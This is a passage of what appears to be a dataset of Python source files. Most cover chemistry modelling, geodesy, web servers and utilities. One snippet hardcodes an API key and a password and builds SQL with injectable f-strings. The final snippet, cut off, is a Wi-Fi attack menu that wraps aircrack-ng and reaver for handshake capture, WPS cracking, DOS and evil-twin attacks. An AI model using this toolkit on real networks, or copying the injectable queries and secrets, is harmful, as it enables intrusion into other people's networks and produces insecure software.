\"Ca\",\"Sr\",\"Ba\",\"Ra\",\"Sc\",\"La\",\"Ac\",\"Ti\",\"Zr\",\"Nb\",\"Ta\",\"Db\",\"Cr\",\"Mo\",\"Sg\",\"Mn\",\"Tc\",\"Re\",\"Bh\",\"Fe\",\"Ru\",\"Os\",\"Hs\",\"Co\",\"Rh\",\n            \"Ir\",\"Mt\",\"Ni\",\"Pd\",\"Pt\",\"Ds\",\"Cu\",\"Ag\",\"Au\",\"Rg\",\"Zn\",\"Cd\",\"Hg\",\"Cn\",\"Al\",\"Ga\",\"In\",\"Tl\",\"Nh\",\"Si\",\"Ge\",\"Sn\",\"Pb\",\"Fl\",\n            \"As\",\"Sb\",\"Bi\",\"Mc\",\"Se\",\"Te\",\"Po\",\"Lv\",\"Cl\",\"Br\",\"At\",\"Ts\",\"He\",\"Ne\",\"Ar\",\"Kr\",\"Xe\",\"Rn\",\"Og\"]\n    word1=sen_space[0]\n    word_space=list(word1[0])\n    end=\"\\n\"\n    word_space.append(end)\n    all_smile=[]\n    for i in range(len(sen_space)):\n        word1=sen_space[i]\n        word_space=list(word1[0])\n        word=[]\n        j=0\n        while j<len(word_space):\n            word_space1=[]\n            word_space1.append(word_space[j])\n            if j+1<len(word_space):\n                word_space1.append(word_space[j+1])\n                word_space2=''.join(word_space1)\n            else:\n                word_space1.insert(0,word_space[j-1])\n                word_space2=''.join(word_space1)\n            if word_space2 not in element_table:\n                word.append(word_space[j])\n                j=j+1\n            else:\n                word.append(word_space2)\n                j=j+2\n\n        word.append(end)\n        all_smile.append(list(word))\n    val=[]\n    for i in range(len(all_smile)):\n        for j in range(len(all_smile[i])):\n            if all_smile[i][j] not in val:\n                val.append(all_smile[i][j])\n    val.remove(\"\\n\")\n    val.insert(0,\"\\n\")\n\n    return val, all_smile\n\n\ndef prepare_data(smiles,all_smile):\n    all_smile_index=[]\n    for i in range(len(all_smile)):\n        smile_index=[]\n        for j in range(len(all_smile[i])):\n            smile_index.append(smiles.index(all_smile[i][j]))\n        all_smile_index.append(smile_index)\n    X_train=all_smile_index\n    y_train=[]\n    for i in range(len(X_train)):\n\n        x1=X_train[i]\n        x2=x1[1:len(x1)]\n        x2.append(0)\n        y_train.append(x2)\n\n    return X_train,y_train\n\n\"\"\"\n#UNUSED CODE.\ndef generate_smile(model,val):\n    end=\"\\n\"\n    start_smile_index= [val.index(\"C\")]\n    new_smile=[]\n\n    while not start_smile_index[-1] == val.index(end):\n        predictions=model.predict(start_smile_index)\n        ##next atom probability\n        smf=[]\n        for i in range (len(X)):\n            sm=[]\n            for j in range(len(X[i])):\n                #if np.argmax(predictions[i][j])=!0\n                sm.append(np.argmax(predictions[i][j]))\n            smf.append(sm)\n\n        #print sm\n        #print smf\n        #print len(sm)\n\n        new_smile.append(sampled_word)\n    #sentence_str = [index_to_word[x] for x in new_sentence[1:-1]]\n    #return new_sentence\n\"\"\"\n\n\ndef save_model(model):\n    \"\"\"\n        Save model by JSON and keras scheme.\n    \"\"\"\n    # serialize model to JSON\n    model_json = model.to_json(indent=4, separators=(',', ': '))\n    with open(\"model2.json\", \"w\") as json_file:\n         json_file.write(model_json)\n    # serialize weights to HDF5\n    model.save(\"model.h5\",save_format='h5')\n    model.save(\"model\",save_format='tf')\n    print(\"Saved model to disk\")\n\n\ndef _createModel(vocab_size: int, embed_size: int, N: int):\n    \"\"\"\n        Create NN Model.\n    \"\"\"\n    input = Input(shape=(N,))\n    x = Embedding(input_dim=vocab_size, output_dim=embed_size, input_length=N, mask_zero=False)(input)\n    x = GRU(units=256,activation='tanh',return_sequences=True)(x)\n    x = Dropout(.2)(x)\n    x = GRU(units=256,activation='tanh',return_sequences=True)(x)\n    x = Dropout(.2)(x)\n    x = TimeDistributed(Dense(embed_size, activation='softmax'))(x)\n    model = Model(inputs=input, outputs=x)\n\n    return model\n\nclass EarlyStoppingByTimer(Callback):\n    \"\"\"\n        Stop training when the loss is at its min, i.e. the loss stops decreasing.\n\n        Arguments:\n        patience: Number of epochs to wait after min has been hit. After this\n        number of no improvement, training stops.\n    \"\"\"\n    def __init__(self, patience=0, startTime=datetime.datetime.now(datetime.timezone(datetime.timedelta(hours=+9),'JST')), timeLimit=datetime.timedelta(hours=23)):\n        super(EarlyStoppingByTimer, self).__init__()\n        self._time = sta",
    "import torch\nimport torch.nn as nn\nimport numpy as np\nfrom scipy.stats import norm\nimport sys\nsys.path.append('..')\nfrom VecKM_large import VecKM\nfrom complexPyTorch.complexLayers import ComplexConv1d, ComplexReLU, NaiveComplexBatchNorm1d\n\ndef strict_standard_normal(d):\n    # this function generate very similar outcomes as torch.randn(d)\n    # but the numbers are strictly standard normal, no randomness.\n    y = np.linspace(0, 1, d+2)\n    x = norm.ppf(y)[1:-1]\n    np.random.shuffle(x)\n    x = torch.tensor(x).float()\n    return x\n\nclass NormalEstimator(nn.Module):\n    def __init__(self, args, d=1024, p=1024):\n        super().__init__()\n        self.point_batch_size = 100000\n        self.alpha_list = args.alpha_list\n        self.beta_list = args.beta_list\n        self.n_reso = len(self.alpha_list)\n        self.n_scales = len(self.beta_list)\n        self.sqrt_d = d ** 0.5\n\n        self.vkm = VecKM(d, args.alpha_list, args.beta_list, p)\n\n        self.feat_trans = nn.Sequential(\n            ComplexConv1d(d, 128),\n            NaiveComplexBatchNorm1d(128),\n            ComplexReLU(),\n            ComplexConv1d(128, 128),\n            NaiveComplexBatchNorm1d(128)\n        )\n\n        self.out_fc = nn.Sequential(\n            nn.Linear(128, 64),\n            nn.BatchNorm1d(64),\n            nn.ReLU(),\n            nn.Linear(64, 3)\n        )\n\n    def forward(self, pts, normal):\n        G = self.vkm(pts)                                                       # C(n, n_scales * n_reso, d)\n        G = G.transpose(-2,-1)                                                  # C(n, d, n_scales * n_reso)\n        G = self.feat_trans(G)                                                  # C(n, 128, n_scales * n_reso)\n        G = G.real**2 + G.imag**2                                               # R(n, 128, n_scales * n_reso)\n        G = torch.max(G, dim=-1)[0]                                             # R(n, 128)\n        pred = self.out_fc(G)\n        return pred, normal\n    \n\n\n",
    "import datetime\nimport os\nimport time\nfrom typing import List\n\nimport psycopg2\n\napi_key = os.getenv(\"API_KEY\")\napi_key = \"3A21E339E784994D3772723F327FC337\"\n\n\nclass Database:\n    _instance = None\n\n    @classmethod\n    def get_instance(cls):\n        if not cls._instance:\n            cls._instance = Database()\n        return cls._instance\n\n    def __init__(self):\n        self.connection = psycopg2.connect(\n            host=\"localhost\",\n            database=\"postgres\",\n            user=\"postgres\",\n            password=\"12345678\",\n            port=\"5432\",\n        )\n        self.cursor = self.connection.cursor()\n\n    def insert_listing(self, lst):\n        avatar = parse_hash_from_link(lst.owner_avatar)\n        self.cursor.execute(\n            \"INSERT INTO listings(item_name, time, price, owner_name, owner_avatar, profile_link) \"\n            f\"VALUES ( %s, now(), {lst.price}, %s, '{avatar}', %s)\"\n            \" ON CONFLICT DO NOTHING\", (lst.item_name, lst.owner_name, lst.profile_link)\n        )\n        self.connection.commit()\n        if self.cursor.rowcount:\n            print(\n                f\"{datetime.datetime.now()} {lst.item_name: <60} ${lst.price: <4} {lst.owner_name} {lst.profile_link}\")\n\n    def get_listings(self, minprice=0, maxprice=-1, limit=50):\n        conditions = [\n            f\" price > {minprice} \",\n            f\" price < {maxprice} \" if maxprice != -1 else \"true\",\n        ]\n        self.cursor.execute(\n            f\"SELECT * FROM listings WHERE {' AND '.join(conditions)} ORDER BY id DESC LIMIT {limit}\")\n        # print(f\"SELECT * FROM listings WHERE {' AND '.join(conditions)} ORDER BY id DESC LIMIT {limit}\")\n\n        out = []\n        for row in self.cursor.fetchall():\n            listing = Listing(\n                id=row[0],\n                item_name=row[1],\n                time=row[2],\n                price=row[3],\n                owner_name=row[4],\n                owner_avatar=row[5],\n                profile_link=row[6]\n            )\n            out.append(listing)\n        # print(\"\\n\\nimg data out >>>> \", out)\n        return out\n\nclass Listing:\n    item_name: str\n    time: str\n    price: int\n    owner_name: str\n    owner_avatar: str\n    profile_link: str\n\n    def __init__(self, **kwargs):\n        for key, value in kwargs.items():\n            setattr(self, key, value)\n\n    def __str__(self):\n        return f\"{self.item_name} {self.price} {self.owner_name}\"\n\ndef parse_hash_from_link(link):\n    return link.split('/')[3]\n\ndef parse_price(string):\n    return int(string[1:].replace(\",\", \"\").split('.')[0])",
    "import argparse\nimport requests\nimport threading\nimport pycountry\n\ndef ping(host, countries):\n    global avg_ping, avg_loss\n    if not host.replace('.', '').isnumeric():\n        url = f'https://cloudflare-dns.com/dns-query?name={host}&type=A'\n        host = requests.get(url, headers={'Referer': 'https://console.zenlayer.com', 'Accept': 'application/dns-json'}).json()\n        if 'Answer' in host:\n            host = host['Answer'][0]['data']\n        else:\n            print(\"Couldn't resolve host via CloudFlare. Exiting.\")\n            raise SystemExit\n\n    locations, name_location, avg_ping, avg_loss = [], [], [], []\n    list = requests.get('https://console.zenlayer.com/lgApi/api/devices')\n    if list.status_code != 200:\n        print('Error while fetching nodes. Exiting.')\n        raise SystemExit\n    for i in list.json():\n        name = i['name'].replace(' ', '_').replace('(', '').replace(')', '').lower().replace(',', '')\n        name_location.append({'name': name, 'normalized': i['name']})\n        locations.append(name)\n\n    threads = []\n    for location in locations:\n        if not countries or location[:2].upper() in countries:\n            thread = threading.Thread(target=check_ping, args=(host, location, name_location))\n            thread.start()\n            threads.append(thread)\n\n    if not threads:\n        print('No nodes with that country. Exiting.')\n    else:\n        for thread in threads:\n            thread.join()\n        print(f'Average ping: {sum(avg_ping) // len(avg_ping)} ms - Average loss: {sum(avg_loss) // len(avg_loss)}%')\ndef check_ping(host, location, name_location):\n    for i in name_location:\n        if i['name'] == location:\n            location_n = i['normalized']\n            break   \n    payload = {\"query_vrf\": \"global\", \"query_location\": location, \"query_type\": \"ping\", \"query_target\": host}\n    response = requests.post(f'https://console.zenlayer.com/lgApi/api/query/', json=payload)\n    if response.text.startswith('{\"output\":'):\n        try:\n            ping = response.json()['output'].split('min/avg/max')[1].split('/')[2]\n            loss = int(response.json()['output'].split('received,')[1].split('%')[0])\n        except:\n            if 'Error connecting to' in response.json()['output']:\n                status = 'Node offline'\n            else:\n                status = 'Error on node'\n            ping = '0 ms'\n            loss = 100\n        status = 'Online' if loss < 50  else 'Offline'\n        if location_n[:2].isalpha():\n            location_n = f'{pycountry.countries.get(alpha_2=location_n[:2]).flag} {location_n[2:]}'\n        print(f'{location_n} - {status} - {ping} - {loss}% loss {\"- CACHED\" if \"cached\" in response.json() and response.json()[\"cached\"] else \"\"}')\n        avg_ping.append(int(ping.split('.')[0].replace('ms', ''))), avg_loss.append(loss)\n    else:\n        print(f'Error while pinging from location: {location_n} \\n Recieved: {response.text}')\n\ndef list_countries():\n    list = requests.get('https://console.zenlayer.com/lgApi/api/devices').json()\n    countries = []\n    for i in list:\n        countries.append(i['name'])\n    print(countries)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Ping tool')\n    parser.add_argument('--host', help='Host to ping')\n    parser.add_argument('--country', nargs='+', help='Countries to ping from')\n    parser.add_argument('--list', action='store_true', help='List all nodes')\n    args = parser.parse_args()\n    if args.list:\n        list_countries()\n        raise SystemExit\n    if not args.host:\n        print('Please provide a host to ping. Exiting.')\n        raise SystemExit\n    ping(args.host, args.country)\n",
    "#!/usr/bin/env python3\n\n\"\"\"This script verifies that the RINEX files in the current directory are\nsuitable for inclusion in the NGCA.\n\nIt runs the following checks:\n    1) Antenna type is supported and height is a float \n        - this can be removed when turned into a function for the S3 bucket    \n    2) Observation length (greater than 6 hrs but less than 48 hrs); \n    3) Sample interval (should be 30 seconds);\n        - this can be removed when turned into a function for the S3 bucket    \n    4) The file is from 1 June, 1994 or later no IGS products before that time;\n        - this can be removed when turned into a function for the S3 bucket    \n    5) DOY, i.e., that the DOY in the filename matches the first DOY of the data\n\nRinexAntLs.txt is created from the information contained in the RINEX\nheaders and the log file lists all the RINEX files that were deleted\n\"\"\"\n\nimport sys\n\nimport logging\nimport re\nimport os\nimport datetime\nimport statistics\n\n\n# Set up logging\nlogging.basicConfig(\n    filename = 'verifySub.log',\n    level = logging.INFO\n)\n\n# Read the supported antennas into a set\nantTypes = set()\nwith open('/home/fedora/antTypes.dat', 'r') as f:\n    for line in f:\n        cols = line.split()\n        antTypes.add(cols[0])\n        \n# Compile the regular expressions\np1 = re.compile('^\\w{8}\\.\\d{2}o$', re.I)\np2 = re.compile(r'RINEX VERSION / TYPE')\np3 = re.compile(r'ANT # / TYPE')\np4 = re.compile(r'ANTENNA: DELTA H/E/N')\np5 = re.compile('^\\d+\\.?\\d+$')\np6a_str = '^>\\s\\d{4}\\s{1,2}\\d{1,2}\\s{1,2}\\d{1,2}\\s{1,2}\\d{1,2}\\s{1,2}\\d{1,2}'\np6a_str += '\\s{1,2}\\d{1,2}\\.\\d{,7}'\np6a = re.compile(p6a_str)\np6b_str = '^\\s{1,2}\\d{1,2}\\s{1,2}\\d{1,2}\\s{1,2}\\d{1,2}\\s{1,2}\\d{1,2}\\s{1,2}'\np6b_str += '\\d{1,2}\\s{1,2}\\d{1,2}\\.\\d{,7}'\np6b = re.compile(p6b_str)\np7 = re.compile('^\\s\\d\\s')\np8 = re.compile('^\\d{4}')\n\n# Create a datetime object for the earliest IGS products\nigs_start = datetime.datetime(1994, 6, 1, 0, 0, 0)\n\n# Loop over the RINEX files\nfout1 = open('RinexAntLs.txt', 'w')\nfout2 = open('durations.dat', 'w')\nstns = set()\nnum_rnx = 0\nfiles = os.listdir('.')\nfor f in sorted(files):\n    if p1.match(f):\n        epochs = []\n        deltas = []\n        version = False\n        antenna = False\n        height = False\n        good = True\n        for line in open(f, 'r'):\n            line.strip()\n\n            # Get the RINEX version\n            if version == False:\n                if p2.search(line):\n                    version = True\n                    version = float(line.split()[0])\n                    if version >= 3.0:\n                        rnx3 = True\n                    else:\n                        rnx3 = False\n            \n            # Check that the antenna is supported\n            if antenna == False:\n                if p3.search(line):\n                    antenna = True\n                    antDome = line[20:40].strip()\n                    ant = antDome.split()[0]\n                    if ant not in antTypes:\n                        logging.info(f + ': unsupported antenna type')\n                        good = False\n                        break\n            \n            # Check that the height is a number\n            if height == False:\n                if p4.search(line):\n                    height = True\n                    height = line[0:14].strip()\n                    if not p5.match(height):\n                        logging.info(f + ': antenna heights must be a number')\n                        good = False\n                        break\n            \n            # Turn the epoch lines into datetime objects and add to an array\n            if rnx3:\n                if p6a.match(line):\n                    date_string = '{:4s} {:2s} {:2s} {:2s} {:2s} {:2s} {:6s}' \\\n                            .format(line[2:6], line[7:9], line[10:12],\n                                    line[13:15], line[16:18], line[19:21],\n                                    line[22:28])\n                    epoch = datetime.datetime.strptime(date_string, \\\n                            '%Y %m %d %H %M %S %f')\n                    epochs.append(epoch)\n            elif not rnx3:\n                if p6b.match(line):\n                    date_string = '{:2s} {:2s} {:2s} {:2s} {:2s} {:2s} {:6s}' \\\n                            .format(line[1:3], line[4:6], line[7:9],\n                                    line[10:12], line[13:15], line[16:18],\n                                    line[19:25])\n                    if p7.match(date_string):\n                        parts = date_string.split()\n                        for i in range(len(parts)):\n                            if len(parts[i]) == 1:\n                                parts[i] = '0' + parts[i]\n                        date_string = ' '.join(parts)\n                    if date_string[15:17] == '60':\n                        tmp = date_string[:15] + '00' + date_string[17:]\n                        date_string = tmp\n                    if date_string[18:25] != '000000':\n                        seconds = float(date_string[15:1",
    "from __future__ import annotations\n\nfrom enum import auto, Enum\nfrom io import BytesIO, StringIO\nfrom time import time\nfrom typing import Awaitable, Callable, Iterable, List, Optional, Tuple, Union\nfrom urllib.parse import unquote\n\nfrom wsproto.connection import Connection, ConnectionState, ConnectionType\nfrom wsproto.events import (\n    BytesMessage,\n    CloseConnection,\n    Event as WSProtoEvent,\n    Message,\n    Ping,\n    TextMessage,\n)\nfrom wsproto.extensions import Extension, PerMessageDeflate\nfrom wsproto.frame_protocol import CloseReason\nfrom wsproto.handshake import server_extensions_handshake, WEBSOCKET_VERSION\nfrom wsproto.utilities import generate_accept_token, LocalProtocolError, split_comma_header\n\nfrom .events import Body, Data, EndBody, EndData, Event, Request, Response, StreamClosed\nfrom ..config import Config\nfrom ..typing import (\n    AppWrapper,\n    ASGISendEvent,\n    TaskGroup,\n    WebsocketAcceptEvent,\n    WebsocketResponseBodyEvent,\n    WebsocketResponseStartEvent,\n    WebsocketScope,\n    WorkerContext,\n)\nfrom ..utils import (\n    build_and_validate_headers,\n    suppress_body,\n    UnexpectedMessageError,\n    valid_server_name,\n)\n\n\nclass ASGIWebsocketState(Enum):\n    # Hypercorn supports the ASGI websocket HTTP response extension,\n    # which allows HTTP responses rather than acceptance.\n    HANDSHAKE = auto()\n    CONNECTED = auto()\n    RESPONSE = auto()\n    CLOSED = auto()\n    HTTPCLOSED = auto()\n\n\nclass FrameTooLargeError(Exception):\n    pass\n\n\nclass Handshake:\n    def __init__(self, headers: List[Tuple[bytes, bytes]], http_version: str) -> None:\n        self.http_version = http_version\n        self.connection_tokens: Optional[List[str]] = None\n        self.extensions: Optional[List[str]] = None\n        self.key: Optional[bytes] = None\n        self.subprotocols: Optional[List[str]] = None\n        self.upgrade: Optional[bytes] = None\n        self.version: Optional[bytes] = None\n        for name, value in headers:\n            name = name.lower()\n            if name == b\"connection\":\n                self.connection_tokens = split_comma_header(value)\n            elif name == b\"sec-websocket-extensions\":\n                self.extensions = split_comma_header(value)\n            elif name == b\"sec-websocket-key\":\n                self.key = value\n            elif name == b\"sec-websocket-protocol\":\n                self.subprotocols = split_comma_header(value)\n            elif name == b\"sec-websocket-version\":\n                self.version = value\n            elif name == b\"upgrade\":\n                self.upgrade = value\n\n    def is_valid(self) -> bool:\n        if self.http_version < \"1.1\":\n            return False\n        elif self.http_version == \"1.1\":\n            if self.key is None:\n                return False\n            if self.connection_tokens is None or not any(\n                token.lower() == \"upgrade\" for token in self.connection_tokens\n            ):\n                return False\n            if self.upgrade.lower() != b\"websocket\":\n                return False\n\n        if self.version != WEBSOCKET_VERSION:\n            return False\n        return True\n\n    def accept(\n        self,\n        subprotocol: Optional[str],\n        additional_headers: Iterable[Tuple[bytes, bytes]],\n    ) -> Tuple[int, List[Tuple[bytes, bytes]], Connection]:\n        headers = []\n        if subprotocol is not None:\n            if self.subprotocols is None or subprotocol not in self.subprotocols:\n                raise Exception(\"Invalid Subprotocol\")\n            else:\n                headers.append((b\"sec-websocket-protocol\", subprotocol.encode()))\n\n        extensions: List[Extension] = [PerMessageDeflate()]\n        accepts = None\n        if self.extensions is not None:\n            accepts = server_extensions_handshake(self.extensions, extensions)\n\n        if accepts:\n            headers.append((b\"sec-websocket-extensions\", accepts))\n\n        if self.key is not None:\n            headers.append((b\"sec-websocket-accept\", generate_accept_token(self.key)))\n\n        status_code = 200\n        if self.http_version == \"1.1\":\n            headers.extend([(b\"upgrade\", b\"WebSocket\"), (b\"connection\", b\"Upgrade\")])\n            status_code = 101\n\n        for name, value in additional_headers:\n            if b\"sec-websocket-protocol\" == name or name.startswith(b\":\"):\n                raise Exception(f\"Invalid additional header, {name.decode()}\")\n\n            headers.append((name, value))\n\n        return status_code, headers, Connection(ConnectionType.SERVER, extensions)\n\n\nclass WebsocketBuffer:\n    def __init__(self, max_length: int) -> None:\n        self.value: Optional[Union[BytesIO, StringIO]] = None\n        self.length = 0\n        self.max_length = max_length\n\n    def extend(self, event: Message) -> None:\n        if self.value is None:\n            if isinstance(event, TextMessage):\n                self.value = StringIO()\n            else:\n                self.value = BytesIO()\n        self.length += self.value.write(event.da",
    "import json\n\nfrom requests import Response\n\n\nclass IndexerConf:\n    def __init__(\n        self,\n        datas=None,\n        siteid=None,\n        cookie=None,\n        name=None,\n        rule=None,\n        public=None,\n        proxy=False,\n        parser=None,\n        ua=None,\n        render=None,\n        builtin=True,\n        language=None,\n        pri=None,\n    ):\n        if not datas:\n            return None\n        # ID\n        self.id = datas.get(\"id\")\n        # \u7ad9\u70b9ID\n        self.siteid = siteid\n        # \u540d\u79f0\n        self.name = datas.get(\"name\") if not name else name\n        # \u662f\u5426\u5185\u7f6e\u7ad9\u70b9\n        self.builtin = datas.get(\"builtin\")\n        # \u57df\u540d\n        self.domain = datas.get(\"domain\")\n        # \u641c\u7d22\n        self.search = datas.get(\"search\", {})\n        # \u6279\u91cf\u641c\u7d22\uff0c\u5982\u679c\u4e3a\u7a7a\u5bf9\u8c61\u5219\u8868\u793a\u4e0d\u652f\u6301\u6279\u91cf\u641c\u7d22\n        self.batch = self.search.get(\"batch\", {}) if builtin else {}\n        # \u89e3\u6790\u5668\n        self.parser = parser if parser is not None else datas.get(\"parser\")\n        # \u662f\u5426\u542f\u7528\u6e32\u67d3\n        self.render = render if render is not None else datas.get(\"render\")\n        # \u6d4f\u89c8\n        self.browse = datas.get(\"browse\", {})\n        # \u79cd\u5b50\u8fc7\u6ee4\n        self.torrents = datas.get(\"torrents\", {})\n        # \u5206\u7c7b\n        self.category = datas.get(\"category\", {})\n        # Cookie\n        self.cookie = cookie\n        # User-Agent\n        self.ua = ua\n        # \u8fc7\u6ee4\u89c4\u5219\n        self.rule = rule\n        # \u662f\u5426\u516c\u5f00\u7ad9\u70b9\n        self.public = datas.get(\"public\") if not public else public\n        # \u662f\u5426\u4f7f\u7528\u4ee3\u7406\n        self.proxy = datas.get(\"proxy\") if not proxy else proxy\n        # \u4ec5\u652f\u6301\u7684\u7279\u5b9a\u8bed\u79cd\n        self.language = language\n        # \u7d22\u5f15\u5668\u4f18\u5148\u7ea7\n        self.pri = pri if pri else 0\n\n    def to_dict(self):\n        return {\n            \"id\": self.id or \"\",\n            \"siteid\": self.siteid or \"\",\n            \"name\": self.name or \"\",\n            \"builtin\": self.builtin or True,\n            \"domain\": self.domain or \"\",\n            \"search\": self.search or \"\",\n            \"batch\": self.batch or {},\n            \"parser\": self.parser or \"\",\n            \"render\": self.render or False,\n            \"browse\": self.browse or {},\n            \"torrents\": self.torrents or {},\n            \"category\": self.category or {},\n            \"cookie\": self.cookie or \"\",\n            \"ua\": self.ua or \"\",\n            \"rule\": self.rule or \"\",\n            \"public\": self.public or False,\n            \"proxy\": self.proxy or \"\",\n            \"pri\": self.pri or 0,\n        }\n\n    def to_dict_str(self, ensure_ascii=False, formatted=True):\n        if formatted:\n            return json.dumps(self.to_dict(), ensure_ascii=ensure_ascii, indent=4)\n        return json.dumps(self.to_dict(), ensure_ascii=ensure_ascii)\n\n\ndef check_response_is_valid_json(response: Response):\n    \"\"\"\n    \u89e3\u6790\u8fd4\u56de\u7684\u5185\u5bb9\u662f\u5426\u662f\u4e00\u6bb5 JSON\n    \"\"\"\n    content_type = response.headers.get(\"Content-Type\", \"\")\n    return \"application/json\" in content_type\n",
    "#!/usr/bin/env python3\nimport os\nimport subprocess\nfrom subprocess import check_call\nprint(\"\\nInstalling Needed Tools\")\nprint(\"\\n\")\ncmd0 = os.system(\"apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite bettercap wifipumpkin3\")\ncmd  = os.system(\"sleep 3 && clear\")\ndef intro():\n    cmd  = os.system(\"clear\")\n    print(\"\"\"\\033[1;25m\n\n\n   \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2584\u2584\u2584\u2584       \u2588\u2588\u2588      \u2584\u2588  \u2588\u2588\u2588\u2584\u2584\u2584\u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2584\u2588              \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2584\u2588\u2588   \u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584 \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2588  \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2580    \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588   \u2588\u2588\u2588    \u2580\u2588\u2588\u2588\u2580\u2580\u2588\u2588 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \n  \u2588\u2588\u2588         \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588   \u2580 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588            \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \n\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588           \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2584\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \n         \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \n   \u2584\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u258c    \u2584       \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \n \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588   \u2588\u2580     \u2584\u2588\u2588\u2588\u2588\u2580   \u2588\u2580    \u2580\u2588   \u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n                                                                            \u2580                                                                                                                                                      \nAuthors  : AKASH|ASWIN|SUDEV|SARATH\n-------------------------------------------------------------------------  \n(1)Start monitor mode       \n(2)Stop monitor mode\n(3)Scan Networks                            \n(4)Getting Handshake(monitor mode needed)                                       \n(5)WPS Networks attacks (Bssid,monitor mode needed)\n(6)Scan for WPS Networks\n(7)DOS Attacks\n(8)Captive Portal\n(9)Evil Twin\n(10)Advanced Monitoring\n\n(0)About Our Team\n(00)Exit\n----------------------------------------------------------------------- \"\"\")\n    print(\"\\nEnter your choise here : !# \")\n    var = int(input(\"\"))\n    if var == 1 :\n        print(\"\\nEnter the interface:(Default(wlan0/wlan1))\")\n        interface = input(\"\")\n        order = \"airmon-ng start {} && airmon-ng check kill\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 2 :\n        print(\"\\nEnter the interface:(Default(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airmon-ng stop {} && service network-manager restart\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 3 :\n        print(\"\\nEnter the interface:(Default >> (wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airodump-ng {} -M\".format(interface)\n        print(\"When Done Press CTRL+c\")\n        cmd = os.system(\"sleep 3\")\n        geny  = os.system(order)\n        cmd = os.system(\"sleep 10\")\n        intro()\n    \n    elif var == 4 :\n        print(\"\\nEnter the interface:(Default >>(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order     = \"airodump-ng {} -M\".format(interface)\n        print(\"\\nWhen Done Press CTRL+c\")\n        print(\"\\nNote: Under Probe it might be Passwords So copy them to the worlist file\")\n        print(\"\\nDon't Attack The Network if its Data is ZERO (you waste your time)\")\n        print(\"\\nyou Can use 's' to arrange networks\")\n        cmd       = os.system(\"sleep 7\")\n        geny      = os.system(order)\n        print(\"\\nEnter the bssid of the target?\")\n        bssid     = str(input(\"\"))\n        print(\"\\nEnter the channel of the network?\")\n        channel   = int(input())\n        print(\"Enter the path of the output file ?\")\n        path = str(input(\"\"))\n        print(\"\\nEnter the number of the packets [1-10000] ( 0 for unlimited number)\")\n        print(\"the number of the packets Depends on the Distance Between you and the network\")\n        